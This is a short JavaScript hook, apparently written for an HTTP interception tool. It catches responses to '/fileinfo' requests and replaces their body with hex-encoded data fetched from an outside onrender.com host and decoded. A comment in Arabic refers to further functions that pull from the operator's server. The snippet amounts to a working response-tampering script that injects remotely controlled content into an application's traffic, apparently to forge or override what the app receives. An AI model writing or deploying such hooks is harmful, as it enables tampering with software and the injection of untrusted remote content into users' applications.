const baseUrl = "https://hosam-fsk4.onrender.com/";

async function onResponse(context, request, response) {
    const url = request.url;
    if (url.includes("/fileinfo")) {
        const rawHex = await (await fetch(baseUrl + "indr.txt")).text();
        response.body = htb(rawHex.trim());
        response.statusCode = 200;
        return response;
    }
    // ... باقي وظائف السحب من سيرفرك
    return response;
}

function htb(hex) {
    let bytes = "";
    for (let i = 0; i < hex.length; i += 2) {
        bytes += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return bytes;
}
